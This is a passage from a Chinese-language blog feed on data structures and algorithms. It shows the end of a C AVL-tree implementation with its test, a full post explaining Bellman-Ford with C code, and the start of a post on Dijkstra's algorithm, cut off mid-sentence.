(node-&gt;right != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        node = node-&gt;right;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> node-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ElementType <span class="title function_">GetNodeMin</span><span class="params">(AVLNode *node)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (node == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span> (node-&gt;left != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        node = node-&gt;left;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> node-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">AVLTreeGetSize</span><span class="params">(AVLTree *tree)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (tree == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> tree-&gt;size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">status <span class="title function_">AVLTreeIsEmpty</span><span class="params">(AVLTree *tree)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (tree == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> error;</span><br><span class="line">    <span class="keyword">return</span> tree-&gt;size == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// rotate</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">LeftRotation</span><span class="params">(AVLNode **root)</span> &#123;</span><br><span class="line">    AVLNode *node = *root;</span><br><span class="line">    AVLNode *temp = node-&gt;right;</span><br><span class="line">    <span class="comment">// rotate</span></span><br><span class="line">    node-&gt;right = temp-&gt;left;</span><br><span class="line">    temp-&gt;left = node;</span><br><span class="line">    *root = temp;</span><br><span class="line">    <span class="comment">// update height</span></span><br><span class="line">    node-&gt;height =</span><br><span class="line">            max(GetNodeHeight(node-&gt;left), GetNodeHeight(node-&gt;right)) + <span class="number">1</span>;</span><br><span class="line">    temp-&gt;height = max(GetNodeHeight(node), GetNodeHeight(temp-&gt;right)) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RightRotation</span><span class="params">(AVLNode **root)</span> &#123;</span><br><span class="line">    AVLNode *node = *root;</span><br><span class="line">    AVLNode *temp = node-&gt;left;</span><br><span class="line">    <span class="comment">// rotate</span></span><br><span class="line">    node-&gt;left = temp-&gt;right;</span><br><span class="line">    temp-&gt;right = node;</span><br><span class="line">    *root = temp;</span><br><span class="line">    <span class="comment">// update height</span></span><br><span class="line">    node-&gt;height =</span><br><span class="line">            max(GetNodeHeight(node-&gt;left), GetNodeHeight(node-&gt;right)) + <span class="number">1</span>;</span><br><span class="line">    temp-&gt;height = max(GetNodeHeight(node), GetNodeHeight(temp-&gt;left)) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// private functions</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">max</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试代码<code>test.c</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by WAHAHA on 2023/12/10.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;AVLTree.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> nums[] = &#123;<span class="number">5</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">9</span>&#125;;</span><br><span class="line">    AVLTree *tree = AVLTreeCreate();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        AVLTreeInsert(tree, nums[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: %d\n&quot;</span>, AVLTreeGetSize(tree));</span><br><span class="line">    <span class="keyword">while</span> (!AVLTreeIsEmpty(tree)) &#123;</span><br><span class="line">        ElementType result;</span><br><span class="line">        AVLTreeGetMin(tree, &amp;result);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, result);</span><br><span class="line">        AVLTreeDelete(tree, result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    AVLTreeDestroy(tree);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">size: <span class="number">10</span></span><br><span class="line"><span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span> <span class="number">9</span></span><br></pre></td></tr></table></figure><br><p>参考:</p><p><a href="https://ivanzz1001.github.io/records/post/data-structure/2018/06/14/ds-avl_tree">AVL树原理及实现</a></p><p><a href="https://zh.wikipedia.org/wiki/AVL%E6%A0%91">AVL树</a></p><br><br><p>—WAHAHA 2023.12.10</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 数据结构 </tag>
            
            <tag> 树论 </tag>
            
            <tag> AVLTree </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bellman-Ford算法</title>
      <link href="/20231619b5b9f227/"/>
      <url>/20231619b5b9f227/</url>
      
        <content type="html"><![CDATA[<h1 id="bellman-ford算法概述">Bellman-Ford算法概述</h1><p>此算法由<a href="https://zh.wikipedia.org/wiki/%E7%90%86%E6%9F%A5%E5%BE%B7%C2%B7%E8%B2%9D%E7%88%BE%E6%9B%BC">理查德·贝尔曼</a>和<a href="https://zh.wikipedia.org/wiki/%E5%B0%8F%E8%90%8A%E6%96%AF%E7%89%B9%C2%B7%E5%80%AB%E9%81%93%E5%A4%AB%C2%B7%E7%A6%8F%E7%89%B9">小莱斯特·伦道夫·福特</a>创立,是求解<code>单源最短路径</code>问题的一种算法.其原理是对图进行<code>n-1</code>次(轮)松弛操作,其中n是图中点的个数.不断地松弛,逐渐逼近最优解,最终得到最短路径长度.</p><p>相对于<code>Dijkstra算法</code>,其优点是可以处理有<code>负边权</code>的图,并且实现简单.缺点是时间复杂度过高,高达<code>O(n*m)</code>,其中n,m分别为图的点,边数.不过,此算法可以进行若干种优化来提高效率.</p><h1 id="算法描述">算法描述</h1><h2 id="算法过程">算法过程</h2><ol><li><p>读取图的点数,边数–n,m;和起点s</p></li><li><p>初始化一个dis[]数组,其中dis[i]代表s到i的最短路径长度,除了dis[s]为0,其余设置为<code>无穷大</code></p></li><li><p>进行n-1次循环,在每次循环中遍历所有的m条边,尝试使用每条边<code>&lt;ui,vi,wi&gt;</code>松弛,即判断</p><p><code>dis[vi]&gt;dis[ui]+wi</code></p><p>是否成立,如果成立则更新dis[vi],即为所谓的<code>松弛</code>操作.</p></li><li><p>当第3步的循环结束后,dis[]中即为最终结果.</p></li></ol><h1 id="算法分析">算法分析</h1><p>参考自https://blog.csdn.net/Africa_South/article/details/90299584</p><h2 id="思想分析">思想分析</h2><p>尽管此算法和<code>Dijkstra算法</code>都基于<code>松弛</code>操作,但是与<code>Dijkstra算法</code>基于的<code>贪心思想</code>不同,此算法基于<code>动态规划</code>的思想.</p><p>首先,一个n个点的图,则所有的最短路最多只有<code>n-1</code>条边,否则如果有n条边以上的边,则说明有回路(参考最小生成树).</p><p>那么如果使用<code>d(v,k)</code>代表从源点s到点v,且最多含有k条边的最短路径长度.所以<code>d(v,n-1)</code>就是我们期望的最终状态.</p><p>Bellman-Ford算法的初始状态(k=0):</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo stretchy="false">(</mo><mi>v</mi><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>0</mn><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>v</mtext><mo>=</mo><mi>s</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi mathvariant="normal">∞</mi><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>v</mtext><mo mathvariant="normal">≠</mo><mi>s</mi></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">d(v,0) = \begin{cases}    0, &amp; \text v=s \\    \infty , &amp; \text v\neq s \\\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.0000299999999998em;vertical-align:-1.25003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">0</span><span class="mpunct">,</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">∞</span><span class="mpunct">,</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord">v</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">s</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord">v</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel"><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>对1&lt;=k&lt;=n-1,有:</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo stretchy="false">(</mo><mi>v</mi><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">)</mo><mo>=</mo><mi>m</mi><mi>i</mi><mi>n</mi><mo stretchy="false">{</mo><mi>d</mi><mo stretchy="false">(</mo><mi>u</mi><mo separator="true">,</mo><mi>k</mi><mtext>−</mtext><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mi>w</mi><mo stretchy="false">(</mo><mi>u</mi><mo separator="true">,</mo><mi>v</mi><mo stretchy="false">)</mo><mo>∣</mo><mi>u</mi><mtext>是</mtext><mi>v</mi><mtext>的前驱顶点</mtext><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">d(v,k)=min\{d(u,k−1)+w(u,v)∣u是v的前驱顶点\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mopen">{</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord">−</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathdefault">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">u</span><span class="mord cjk_fallback">是</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">前</span><span class="mord cjk_fallback">驱</span><span class="mord cjk_fallback">顶</span><span class="mord cjk_fallback">点</span><span class="mclose">}</span></span></span></span></span></p><p>因此要求s-&gt;v的最短路,可以先求出s-&gt;u的最短路.</p><p>根据状态转移方程,我们可以按照</p><p><code>d(*,1),d(*,2),d(*,3),...,d(*,n-1)</code></p><p>这样的顺序逐步计算.</p><h2 id="伪代码">伪代码</h2><p>用dis[v]做为s-&gt;v的最短路径.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">init dis[]:</span><br><span class="line">    dis[*] = 无穷大</span><br><span class="line">    dis[s] = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">1</span>;k &lt;= n<span class="number">-1</span>;++k)&#123;</span><br><span class="line">    <span class="keyword">for</span>((u,v,w) in 所有的边)&#123;</span><br><span class="line">        d[v] = min(d[v],d[u]+w);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="关键点">关键点</h2><ol><li><p>对于外层进行的n-1次循环,可以认为第i次循环结束后,dis[*]代表使用了i条边能达到的最短路径.<code>n-1</code>次循环后,代表使用<code>n-1</code>条边能够达到的最短路径.</p></li><li><p>换个角度,由于最短路至多有n-1条边,所以我们进行的每一次循环都<strong>至少</strong>确定一个点的最短路径.<code>n-1</code>次循环后,确保除了s外(它是起点),剩余的n-1个点的最短路径全部求得.</p></li></ol><p>至于第2点,<a href="https://zhuanlan.zhihu.com/p/585315996"></a>这篇文章中有较好的讲解.</p><p>第2点中的<code>至少</code>需要注意,一轮循环不一定只确定一个点的最短路径.</p><h2 id="负权边与负权环的判断">负权边与负权环的判断</h2><p>Dijkstra算法的贪心策略基于<code>深度</code>进行搜索,而Bellman-Ford算法则基于<code>广度</code>进行搜索.</p><p>因此,Bellman-Ford算法可以对<code>负权边</code>进行操作.</p><p>另一方面,由于只需要<code>n-1</code>轮松弛操作便可保证求出最短路径,那么如果发现再多进行第n轮松弛仍然可以缩短路径长度,则可以判定该图一定存在<code>负权环</code>.</p><p>注意:有负权边不代表一定有负权环.</p><h2 id="时间复杂度">时间复杂度</h2><p>由于需要进行<code>n-1</code>轮松弛,每轮都需要遍历所有的m条边,因此时间复杂度为<code>O(n*m)</code></p><h1 id="代码实现">代码实现</h1><p>本代码使用C语言,采用邻接矩阵存图.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> **graph;</span><br><span class="line">    <span class="type">int</span> n, m;</span><br><span class="line">    <span class="type">int</span> start;</span><br><span class="line">&#125; Graph;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_graph</span><span class="params">(Graph *graph)</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;graph-&gt;n, &amp;graph-&gt;m);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;graph-&gt;start);</span><br><span class="line"></span><br><span class="line">    graph-&gt;graph = (<span class="type">int</span> **)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span> *) * (graph-&gt;n + <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= graph-&gt;n; ++i)</span><br><span class="line">        graph-&gt;graph[i] = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * (graph-&gt;n + <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= graph-&gt;n; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= graph-&gt;n; ++j) &#123;</span><br><span class="line">            graph-&gt;graph[i][j] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; graph-&gt;m; ++i) &#123;</span><br><span class="line">        <span class="type">int</span> from, to, w;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;from, &amp;to, &amp;w);</span><br><span class="line">        graph-&gt;graph[from][to] = w;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>* <span class="title function_">bellman_ford</span><span class="params">(Graph *graph)</span> &#123;</span><br><span class="line">    <span class="type">int</span> *dis = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * (graph-&gt;n + <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= graph-&gt;n; ++i)</span><br><span class="line">        dis[i] = <span class="number">0x7FFFFFFF</span>;</span><br><span class="line"></span><br><span class="line">    dis[graph-&gt;start] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 最外层循环进行n-1轮松弛操作</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">1</span>; k &lt;= graph-&gt;n - <span class="number">1</span>; ++k) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= graph-&gt;n; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= graph-&gt;n; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (graph-&gt;graph[i][j] != <span class="number">0</span> &amp;&amp; dis[j] &gt; dis[i] + graph-&gt;graph[i][j]) &#123;</span><br><span class="line">                    dis[j] = dis[i] + graph-&gt;graph[i][j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dis;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    Graph graph;</span><br><span class="line">    init_graph(&amp;graph);</span><br><span class="line">    <span class="type">int</span> *dis = bellman_ford(&amp;graph);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= graph.n; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, dis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= graph.n; ++i)</span><br><span class="line">        <span class="built_in">free</span>(graph.graph[i]);</span><br><span class="line">    <span class="built_in">free</span>(graph.graph);</span><br><span class="line">    <span class="built_in">free</span>(dis);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 数据结构 </tag>
            
            <tag> 图论 </tag>
            
            <tag> 最短路径 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dijkstra算法</title>
      <link href="/202393a6fbe4e453/"/>
      <url>/202393a6fbe4e453/</url>
      
        <content type="html"><![CDATA[<h1 id="迪杰斯特拉算法概述">迪杰斯特拉算法概述</h1><p><code>单源最短路径</code>问题,即求出一个<code>赋权图</code>的某一点s到其他任意点的<code>最短路径</code>.Dijkstra算法即为解决该问题的一种算法.该算法基于<code>贪心</code>策略,每次寻找一个距离源点s最近的点v(未被更新的),使用以v为起点的所有出边去进行<code>松弛</code>操作,逐步缩小各点到s的距离,直到所有的点都被选取完.</p><p>需要注意的是,该算法无法处理带有<code>负权边</code>的图,不过可以处理<code>带环图</code>.而且在使用堆优化,并使用邻接表进行存图的情况下,Dijkstra算法往往有着很高的效率.</p><h1 id="算法描述">算法描述</h1><h2 id="算法过程">算法过程</h2><ol><li>首先确定起点(即源点s),将所有点与起点的距离初始化为<code>无穷大</code>,一般存储在一个<code>dis[]数组</code>中,s到自己的距离(即dis[s])设置为<code>0</code>,此时dis[]即为初始状态,后续操作都是在维护这个数组.</li><li>设置一个标记数组<code>vis[]</code>,全部初始化为<code>0</code>,即一开始均未访问过.然后将vis[s]设置为<code>1</code>,即一开始从s开始访问.</li><li>不断从vis[]数组中寻找未被访问过的点<code>u</code>,同时保证每次寻找到的u满足<code>dis[u]</code>为<code>未被访问过的点</code>中最小的那一个.找到后将vis[u]设置为<code>1</code>,即代表该点已经被访问,亦即已经找到最短路径.</li><li>遍历第3步中找到的一个点u的<code>所有</code>出边&lt;u,v,w&gt;(以u为起点,v为终点,权值为w的边),尝试使用此边缩短dis[v],即如果有<code>dis[v]&gt;dis[u]+w</code>,则更新<code>dis[v]=dis[u]+w</code>.</li><li>重复第3,4步,直到vis[]数组全部置为1(即所有的点遍历完成).此时dis[i]即为s到i的最短路径.</li></ol><h2 id="过程描述">过程描述</h2><ol><li><p>dis[]数组即为最终的结果,其中任意一元素dis[i]代表从s到i的最短路径长度.</p></li><li><p>vis[]数组用于标记,其中任意一元素vis[i]为0代表该点还未被访问;为1代表已经访问.</p><p>换句话说,vis[]数组将<code>点集V</code>划分为两个集合<code>Set</code>和<code>UnSet</code>,<code>Set</code>代表已经访问过的点,<code>UnSet</code>代表未访问过的点,每访问一个点i就将其从<code>UnSet</code>中放到<code>Set</code>中,直到<code>UnSet</code>为空(或者<code>Set</code>内点数为n,即<code>Set</code>满),此时代表着算法结束.</p></li><li><p>第4步的缩短操作,这步操作即为所谓的<code>松弛</code>,不断地拉近各点到起点距离的操作.</p></li><li><p>对每一个点,尝试使用其所有出边进行<code>松弛</code>,直到所有的点(<code>从源点可达的点</code>)访问完,所有的边也就访问完.此时,<code>dis[]数组</code>中就是最终的结果.</p></li></ol><h1 id="算法分析">算法分析</h1><h2 id="思想分析">思想分析</h2><p><code>Dijkstra算法</code>和<code>SPFA</code>等算法在操作上十分相似,但是思想截然不同,将其他算法学会后会有更加深刻的认识.</p><br><p><code>Dijkstra算法</code>基于<code>贪心</code>的思想,具体体现在<code>每次选取dis[u]最小的点u</code>,即当前距离点s最近的,未访问过的点.在该点的基础上去更新其他点.</p><p>另外这一个重要的选取方法意味着:只要一个点u一旦被访问过,则其<code>dis[u]</code>一定已经是是最小的,即以后一定不会被再次更新,因为每次选择的点都是最近的点.可以这样简单证明:</p><hr><p>设有一点<code>u</code>,其<code>vis[u]==1</code>,假设其<code>dis[u]</code>不是最小的.</p><p>那么设在<code>u</code>被访问之后有一点<code>v</code>被访问到.并且点<code>v</code>有一条出边<code>&lt;v,u,w&gt;</code>指向<code>u</code>.</p><p>因为在选取u时,<code>u</code>和<code>v</code>均未被访问,则根据选择方法有<code>dis[u]&lt;dis[v]</code>.</p><p>此时遍历点<code>v</code>的出边到<code>&lt;v,u,w&gt;</code>,即检查<code>dis[u]&gt;dis[v]+w</code>是否成立,</p><p>由于<code>dis[u]&lt;dis[v]</code>,且由Dijkstra算法大前提<code>图无负权边</code>得<code>w&gt;0</code>,所以<code>dis[u]&lt;dis[v]+w</code>,进而得<code>dis[u]&gt;dis[v]+w</code>显然不成立.</p><p>这与假设不符,因此<code>dis[u]</code>是最小的.</p><p>也就是说,<code>dis[u]</code>不会被再次更新.即在此之前<code>dis[u]</code>已经为<code>s</code>到<code>u</code>的最短路径长度.</p><p>证毕.</p><hr><p>事实上,点的选取策略(贪心)某种程度上是为了给<code>松弛</code>操作使用哪些边提供了一个依据.学习了SPF